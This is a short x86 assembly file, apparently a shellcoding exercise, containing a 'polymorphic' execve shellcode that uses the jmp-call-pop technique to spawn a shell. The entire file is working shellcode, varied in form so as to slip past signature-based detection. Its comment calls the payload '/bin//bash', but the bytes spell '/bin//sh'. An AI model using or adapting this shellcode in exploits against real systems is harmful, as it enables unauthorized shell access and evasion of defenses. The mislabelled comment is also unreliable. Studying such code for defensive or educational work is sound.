global _start
section .text

_start:

	; Russel Willis version of polymorphic execve (using jmp-call-pop)
	
	sub ecx,ecx
	and eax, eax
	push eax
	or al,0xb
	
	jmp short payload
continue:
	pop esi
	xchg esp,esi
	cdq
	xchg ebx,esp
	int 0x80

	; This is the payload ("/bin//bash") to be read to the stack.
payload:
	call continue
	code: db 0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68
		
